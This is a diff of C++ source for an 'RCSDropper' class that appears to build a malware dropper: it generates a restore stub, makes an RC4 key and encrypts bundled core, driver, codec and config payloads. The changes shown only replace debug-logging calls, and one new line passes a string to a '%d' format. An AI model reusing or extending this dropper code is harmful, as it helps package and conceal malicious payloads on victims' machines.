@@ -64,10 +64,10 @@ std::size_t RCSDropper::restoreStub( DWORD currentVA )
 		dropperVA = headerVA + sizeof(DropperHeader);
 		stage1VA = h->stage1.VA;
 
-		DBGTRACE_HEX("Restore  VA : ", currentVA, NOTIFY );
-		DBGTRACE_HEX("Header   VA : ", headerVA, NOTIFY );
-		DBGTRACE_HEX("Dropper  VA : ", dropperVA, NOTIFY );
-		DBGTRACE_HEX("Stage1   VA : ", stage1VA, NOTIFY);
+		DEBUG_MSG(D_VERBOSE, "Restore  VA : %08x", currentVA);
+		DEBUG_MSG(D_VERBOSE, "Header   VA : %08x", headerVA);
+		DEBUG_MSG(D_VERBOSE, "Dropper  VA : %08x", dropperVA);
+		DEBUG_MSG(D_VERBOSE, "Stage1   VA : %08x", stage1VA);
 	}
 
 	AsmJit::Assembler stub;
@@ -108,7 +108,7 @@ void RCSDropper::generateKey()
 	std::ostringstream skey;
 	for (int i = 0; i < RC4KEYLEN; ++i)
 			skey << hex << static_cast<unsigned short int>( h->rc4key[i] );
-	DBGTRACE("RC4 Key : ", skey.str(), NOTIFY);
+	//DEBUG_MSG(D_EXCESSIVE, "RC4 Key : %s", skey.str().c_str());
 }
 
 void RCSDropper::encrypt()
@@ -116,22 +116,22 @@ void RCSDropper::encrypt()
 	DropperHeader* h = header();
 
 	// TODO encrypt files
-	DBGTRACE("Encrypting core   ... ", (DWORD) h->files.core.size, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Encrypting core           ... %d", (DWORD) h->files.core.size);
 	encryptFile_(h->files.core);
 
-	DBGTRACE("Encrypting core (64bit)  ... ", (DWORD) h->files.core64.size, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Encrypting core (64bit)   ... %d", (DWORD) h->files.core64.size);
 	encryptFile_(h->files.core64);
 
-	DBGTRACE("Encrypting config ... ", (DWORD) h->files.config.size, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Encrypting config         ... %d", (DWORD) h->files.config.size);
 	encryptFile_(h->files.config);
 
-	DBGTRACE("Encrypting driver ... ", (DWORD) h->files.driver.size, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Encrypting driver         ... %d", (DWORD) h->files.driver.size);
 	encryptFile_(h->files.driver);
 
-	DBGTRACE("Encrypting driver (64bit) ... ", (DWORD) h->files.driver64.size, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Encrypting driver (64bit) ... %d", (DWORD) h->files.driver64.size);
 	encryptFile_(h->files.driver64);
 
-	DBGTRACE("Encrypting codec  ... ", (DWORD) h->files.codec.size, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Encrypting codec          ... %d", (DWORD) h->files.codec.size);
 	encryptFile_(h->files.codec);
 }
 
@@ -167,9 +167,9 @@ RCSDropper::RCSDropper(const char* filepath)
 	offset_.restore = 0;
 
 	offset_.header = std::max<std::size_t>(restoreStub( 0 ), 32);
-	DBGTRACE("Size of restore stub: ", offset_.header, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Size of restore stub: %d", offset_.header);
 	// XXX magic number!
-	DBGTRACE("Offset to header: ", offset_.header, NOTIFY);
+	DEBUG_MSG(D_DEBUG, "Offset to header:     %d", offset_.header);
 	offset_.stage1 = offset_.header + fileSize;
 
 	loadFile(filepath);
@@ -192,7 +192,7 @@ bool RCSDropper::verifyCookerVersion()
 	boost::trim_left(version);
 	boost::trim_right(version);
 
-	DBGTRACE("Dropper built with cooker version: ", version, NOTIFY);
+	DEBUG_MSG(D_INFO, "Dropper built with cooker version: %s", version.c_str());
 
 	try {
 
@@ -200,14 +200,17 @@ bool RCSDropper::verifyCookerVersion()
 			return true;
 
 	} catch (boost::regex_error& e) {
-		DBGTRACE("Found version: ", h->version, NOTIFY);
-		DBGTRACE("Required cooker version is not a valid regular expression: ", e.what(), NOTIFY);
+		DEBUG_MSG(D_DEBUG, "Found version: %s", version.c_str());
+		DEBUG_MSG(D_WARNING, "Required cooker version is not a valid regular expression: %d", e.what());
 		return false;
 	} catch (...) {
 		return false;
 	}
 
-	DBGTRACE("Dropper built with an invalid cooker version, found ", boost::format("%s, required %s") % version % printable_required_cooker_version, NOTIFY);
+	DEBUG_MSG(D_ERROR, "Dropper built with an invalid cooker version, found %s required %s",
+			version.c_str(),
+			printable_required_cooker_version.c_str());
+
 	return false;
 }
 
